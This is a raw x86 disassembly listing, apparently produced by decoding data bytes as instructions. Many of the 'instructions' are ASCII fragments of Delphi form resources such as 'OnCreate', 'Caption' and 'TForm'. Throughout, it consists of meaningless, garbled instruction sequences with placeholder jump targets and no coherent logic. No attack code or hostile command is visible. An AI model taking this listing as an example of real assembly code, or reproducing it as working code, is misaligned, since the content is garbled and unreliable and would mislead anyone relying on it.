cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
inc ebx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
imul ebp [ edi + 0x6e ] 0x69570500
je r-xdata
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
jb r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6548540e
popad
outsd
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
mov al [ 0xffffffffc8004545 ]
je r-xdata
pop ecx
outsb
je r-xdata
inc ebp
add al cl
add [ ecx + edx * 4 + 0x45a00043 ] al
add [ eax ] al
add [ eax ] bl
outsd
insb
push cs
push esp
dec eax
popad
jb r-xdata
outsb
inc edx
outsd
outsd
insb
popad
outsd
outsb
je r-xdata
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
test [ ecx + 0x45a00043 ] dl
add [ eax ] bl
pop es
dec ecx
outsb
je r-xdata
inc esp
add [ edi + ebx * 4 - 0x583ffbd ] bh
inc esp
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax + edx * 4 + 0x40b40043 ] dh
inc ebp
add al dl
inc ebp
inc ebp
add [ edx + ecx * 4 - 0xdb7ffbf ] al
inc ebx
add ah bh
dec ebx
inc ebx
add [ eax + edx ] bh
inc eax
add [ eax + 0x4e ] ah
inc ebx
add [ ebx + 0x435830c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 2 ] dl
je r-xdata
outsd
outsb
je r-xdata
add cl [ eax ]
je r-xdata
outsd
insb
push cs
push esp
dec eax
popad
jb r-xdata
or [ edx ] al
in al dx
jb r-xdata
inc ebx
add [ eax + 0x2 ] bh
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al 0x59
outsb
push cs
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
outsd
insb
or [ edi ] al
push ebx
sub_435886
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x28 ] cl
pushfd
inc ebx
add al cl
hlt
sub_435c36
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
inc esp
jb r-xdata
dec edi
push eax
outsd
jo r-xdata
push esi
inc ebx
add al ch
les eax [ ebx ]
cmp ch al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001c ] al
outsb
inc esp
inc esp
outsd
ja r-xdata
outsb
jb r-xdata
jo r-xdata
inc ebx
add [ ebp + eax * 8 + 0x10043 ] cl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
push cs
dec edi
ja r-xdata
sub [ ecx + 0xd80044 ] al
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xd8656c62
xchg [ eax + eax + 0x30 ] eax
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0028 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
push eax
inc ebx
add [ eax + 0x2 ] dh
add bh bh
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
arpl [ ebx + 0x40 ] bp
push eax
inc ebx
add [ eax + 0x2 ] ah
add bh bh
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
jb r-xdata
push edx
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
cld
push esi
inc ebx
add ah bh
les eax [ ebx ]
push esp
lds eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6e4f0e00
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
dec ebp
outsd
jbe r-xdata
add [ eax ] al
add [ eax + 0x4f09002f ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax + 0x4f0b002d ] al
mov al 0x80
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
adc al 0x4f
outsb
inc ebx
jb r-xdata
add bh bh
insb
or dh [ edx + esi * 2 + 0x56 ]
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0032 ] al
outsb
je r-xdata
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
jpe r-xdata
jb r-xdata
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
insb
imul esp [ ebx + 0x6b ] r-xdata
adc ch al
inc ebx
add [ eax - 0x3b ] dh
push ebp
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ edi + 0x6e ] ecx
popad
je r-xdata
push es
je r-xdata
imul esp [ ebx + 0x61 ] 0x6f43086c
insd
inc ebx
je r-xdata
pop eax
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
add [ eax ] al
add [ edx ] al
add [ eax ] al
jb r-xdata
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or ecx [ edi + 0x6e ]
inc ecx
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
je r-xdata
push ebx
je r-xdata
add al 0x85
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
add [ eax ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
pop eax
push edi
inc ebx
add [ eax * 8 - 0x3a73ffbd ] ah
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
push esi
inc ebx
add [ eax ] dl
lds eax [ ebx ]
jo r-xdata
push edi
inc ecx
add al bh
add [ eax ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or [ edi + 0x6e ] ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
inc esp
add [ esi + eax * 8 + 0x44 ] bl
inc ecx
jne r-xdata
je r-xdata
insb
jae r-xdata
outsd
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
outsd
insd
push edx
imul esp [ edi + 0x68 ] 0x6d740974
inc esp
jb r-xdata
jo r-xdata
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
add [ eax + eax - 0x18 ] 0x0
add bh bh
call 0x2425caf
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
inc esp
jb r-xdata
add [ edx + edi * 8 + 0x44 ] bh
inc esp
outsd
or [ ebx + esi * 2 + 0x4d ] dh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
cli
inc esp
popad
outsb
jne r-xdata
dec ebp
add al [ eax ]
add [ eax ] al
cwde
pop edi
inc ebx
add [ esi ] al
pop edi
inc ebx
add [ ebx ] al
or [ esp + edx * 2 + 0x69 ] edx
arpl [ ebx + 0x4d ] bp
popad
jb r-xdata
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add ah cl
mov [ 0x40b40043 ] al
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
insb
jae r-xdata
je r-xdata
je r-xdata
add [ 0x6f426d74 ] cl
je r-xdata
add [ eax ] al
push esp
pop edi
inc ebx
mov eax eax
adc [ edi + 0x43 ] bl
add [ ebx ] al
adc al 0x54
push esp
jb r-xdata
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi + ebx * 2 ] cl
inc ebx
add [ esp + esi * 2 ] cl
add [ eax ] 0x0
add [ eax + 0x4f09002c ] al
outsb
inc esp
jb r-xdata
test [ edx - 0xdb7ffbf ] cl
insd
inc ebx
insb
or [ ebx + 0x6f ] al
add [ edx + ecx * 4 - 0xdb7ffbf ] al
dec esi
outsd
outsb
inc eax
add [ eax ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] bl
inc ebx
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
je r-xdata
arpl [ ebx + 0x42 ] bp
popad
jb r-xdata
add [ ecx ] cl
je r-xdata
outsd
jb r-xdata
dec ebp
outsd
jne r-xdata
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jo r-xdata
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
fdivr st0
in al 0x33
inc eax
add [ eax ] bl
or [ edx ] al
in al dx
insb
jae r-xdata
inc ebx
add [ eax + 0x2 ] al
add [ eax ] al
sbb [ edi + 0xec40044 ] cl
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
or al 0x61
inc edx
outsd
add [ edi + ebx * 2 + 0x43 ] dl
jb r-xdata
pushad
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
push esp
outsd
push ebx
jpe r-xdata
or cl [ edi + 0x6e ]
add [ eax ] al
sub [ edx ] 0x0
outsb
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002a ] al
jb r-xdata
je r-xdata
pop edi
inc ebx
add [ ebx ] al
or dl [ esp + edx * 2 + 0x69 ]
arpl [ ebx + 0x53 ] bp
je r-xdata
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
add al bl
clc
je r-xdata
insb
add [ eax ] al
outsb
je r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x600435f ] bl
imul esp [ ebx + 0x6b ] 0x6c797453
sub_43607a
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_43609e
inc esp
add [ eax + edi + 0x39780045 ] bh
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
arpl [ ebx + 0x42 ] bp
popad
jb r-xdata
fwait
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
les ecx [ ebp + 0x16c0044 ]
add bh bh
test al 0x3b
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6f420b00
jb r-xdata
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
movsb [ edi ] [ esi ]
mov [ 0xc100043 ] eax
inc ebp
add [ eax - 0x5c ] bl
inc ebx
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
add [ esi + ecx + 0x45 ] bh
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ebx
add [ edx + edi + 0x186c0045 ] bl
inc ebp
add [ eax + 0x1800454c ] dl
aaa
inc ebp
add [ eax ] cl
cmp al [ ebp ]
add eax 0x4ebd1400
mov esp 0x14bd15
mov bl 0xff
inc eax
movsd [ edi ] [ esi ]
inc ebx
add al ch
test eax 0xa5800043
inc ebx
add [ ebx + ebp * 4 - 0x5637ffbd ] bh
inc ebx
add [ ecx ] cl
push esp
push esp
jb r-xdata
inc ebp
add [ eax + 0x39 ] bh
rcr [ ecx ] 0x43
add [ edi ] al
or [ esp + edx * 2 + 0x72 ] edx
popad
arpl [ ebx + 0x42 ] bp
popad
jb r-xdata
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add [ eax ] al
add [ eax ] al
pushad
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
movsd [ edi ] [ esi ]
add [ eax ] eax
dec eax
cmp eax [ ebp ]
push r-xdata
add [ ecx ] ah
add bh bh
loopne r-xdata
in al dx
cmp eax [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ 0x336c7443 ] al
inc esp
hlt
add bh bh
enter 0x453b 0x0
insb
jae r-xdata
add ah cl
xchg edx eax
inc esp
add [ 0x6f430800 ] dh
insd
inc ebx
je r-xdata
inc esp
add [ ebp + eax * 8 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
les eax [ eax + eax + 0x7c ]
lds eax [ eax + eax ]
or eax [ eax ]
add eax 0x67696c41
outsb
dec esp
jg r-xdata
add [ eax + edi * 2 ] cl
inc esp
add [ ebx ] bl
add bh bh
mov al [ 0x10044c6 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub_436493
mov esp 0x100453c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ 0x69540900 ] ah
arpl [ ebx + 0x4d ] bp
popad
jb r-xdata
adc [ eax ] al
shl [ ebp - 0x570fffbd ] 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
add [ eax + eax ] ah
or edx [ eax + ebp * 2 + 0x75 ]
insd
bound ecx [ ebp + 0x6e ]
je r-xdata
push eax
outsd
jo r-xdata
jae r-xdata
insb
fadd [ gs : edi + 0x1300044 ]
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push cs
dec edi
push esp
pop edi
inc ebx
add [ ecx ] cl
add al [ eax ]
jmp [ eax + ebp * 4 + 0x43 ]
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002c ] al
outsb
jo r-xdata
add [ eax ] eax
outsb
inc ebx
outsd
outsb
je r-xdata
pop edi
inc ebx
add [ edx ] cl
add al [ eax ]
call [ eax - 0x58 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : ecx ] cl
push esp
imul esp [ ebx + 0x6b ] 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xd8656c62
xchg [ eax + eax + 0x30 ] eax
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0028 ] al
add [ eax + 0x4f0a002b ] al
outsb
inc esp
jb r-xdata
js r-xdata
dec ebx
jns r-xdata
je r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
inc ebp
outsb
inc esp
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
inc ecx
add [ eax ] bh
add al [ eax ]
add [ eax ] al
dec edi
jbe r-xdata
inc esp
add [ eax ] cl
add [ eax ] eax
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f090030 ] al
outsb
add [ eax + 0x4f07002e ] al
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x43 ] ch
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
jo r-xdata
add [ eax + eax + 0x10 ] 0x1
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or ecx [ edi + 0x6e ]
adc [ ecx ] al
jb r-xdata
inc [ ecx ]
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002f ] al
outsb
inc ebp
js r-xdata
jb r-xdata
add [ eax + eax + 0x8 ] 0x1
add bh bh
inc esi
outsd
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax - 0x54 ] cl
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
test [ eax + eax ] eax
outsb
jbe r-xdata
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
push ebx
je r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
add [ eax + r-xdata ] dl
add ecx [ 0x494b4854 ]
popad
je r-xdata
je r-xdata
jb r-xdata
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
jb r-xdata
jae r-xdata
inc esp
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070032 ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x24266b5
sub al 0x0
or [ edi + 0x6e ] ecx
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
insb
imul esp [ ebx + ecx * 2 + 0x65 ] 0x179
add [ eax ] al
pop es
add [ eax ] al
add ah bh
inc ebx
add [ esi ] al
push 0x6e6f4e63
pop es
push 0x69685363
je r-xdata
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ ebx ]
push esp
dec eax
dec ebx
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x17265
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x7004367 ] ah
push 0x6968536b
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
movsb [ edi ] [ esi ]
inc ebx
add [ ebx ] al
or edx [ eax + ecx * 2 + 0x4b ]
outsb
jbe r-xdata
mov eax eax
call 0x643ab50
inc ebx
outsd
or al 0x54
dec eax
dec ebx
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x1737265
push es
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
inc ebx
add [ esp + ebp * 4 + 0x43 ] bl
add [ ebx ] cl
push esp
add [ eax + 0x48004031 ] al
lodsb [ esi ]
inc esp
outsd
arpl [ ebx - 0x4 ] bp
mov al [ 0xffffffff90004367 ]
add [ eax + 0x43 ] ch
imul esp [ esi + 0x69 ] 0x1737265
outsd
outsb
add [ eax ] al
lea eax [ bx + si ]
inc ebx
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
insb
jae r-xdata
add eax 0x6c416368
je r-xdata
push 0x72744363
insb
add eax 0x6c416b68
je r-xdata
push 0x7274436b
insb
inc ebx
je r-xdata
insb
jae r-xdata
jb r-xdata
add [ ebx ] al
or eax 0x494b4854
inc eax
add [ eax + 0x68 ] bh
or ch [ eax + 0x63 ]
push ebx
push 0x41746669
insb
je r-xdata
push 0x69685363
je r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
push 0x7478456b
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
fdivr st0
insb
inc ecx
insb
je r-xdata
inc ebx
outsd
shr al 0x67
inc ebx
add [ esi ] al
inc ebx
imul ebp [ edi + 0x6e ] 0x6d726f46
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
inc ebp
add [ edx + ecx * 4 - 0xdb7ffbf ] al
insb
imul esp [ ebx + ecx * 2 + 0x65 ] 0xfc017379
push cs
push 0x72744363
dec ebx
jns r-xdata
je r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
push 0x69685363
je r-xdata
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x69ac0043 ] ah
inc ebx
add [ eax ] bl
je r-xdata
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax - 0x54 ] dh
inc ebx
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
inc ebx
add [ ebp + 0x68dc0040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
imul eax [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
imul eax [ ebx ] r-xdata
sbb [ edx ] al
add [ eax ] al
sbb [ edi + 0xec40044 ] cl
add esp edi
add al [ eax ]
add [ eax ] bl
pop [ eax + eax - 0x3c ]
push cs
insb
inc esp
add [ eax - 0x37ffbabb ] ah
inc eax
add al bl
clc
insb
inc ecx
insb
je r-xdata
lea eax [ eax ]
js r-xdata
inc ebx
inc ebp
add al cl
inc ebx
add [ esi ] al
push cs
push esp
dec eax
dec ebx
dec ecx
outsb
jbe r-xdata
sub_436aaa
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
add al 0xad
inc ebx
add [ eax ] dl
or al 0x45
add [ ebp + ebp * 4 + 0x43 ] al
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
add [ esi + ecx + 0x45 ] bh
add [ esi + ecx ] ah
inc ebp
add [ edx + edi + 0x186c0045 ] bl
inc ebp
add [ eax + 0x1800454c ] dl
aaa
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jns r-xdata
xchg esp eax
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov al 0xd2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf465646f
jg r-xdata
pop es
push esp
dec eax
outsd
je r-xdata
imul eax [ ebx ] 0x7
jae r-xdata
jns r-xdata
adc [ eax ] al
add [ eax ] 0x0
inc [ eax - 0x37010000 ]
int1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
cwde
scasb [ edi ]
inc ebx
add [ esi + ebp * 4 + 0x10043 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x41 ] al
adc [ eax ] al
push es
dec eax
xchg esp eax
add [ eax + eax ] dh
jmp [ eax - 0xa ]
or al 0x0
or [ ecx + 0x75 ] al
je r-xdata
add [ eax + 0x1 ] al
jns r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc eax
add [ edx + 0xff0000 ] bl
rol [ eax + eax + 0x1 ] cl
push 0x20a0043
add bh bh
sub [ esi + 0x10043 ] ch
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
push 0x43
add [ ecx + ebp * 2 + 0x210043 ] bh
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
push cs
push eax
popad
jb r-xdata
insb
imul esp [ ebx + ecx * 2 + 0x65 ] 0x67e47379
inc ebx
add [ ecx ] cl
add al [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add bh bh
pushad
test [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ ebx ] cl
inc ebx
outsd
outsb
jae r-xdata
insb
jae r-xdata
cmp al 0x45
add [ esp + edi + 0x10045 ] ah
add [ eax ] al
add [ eax ] al
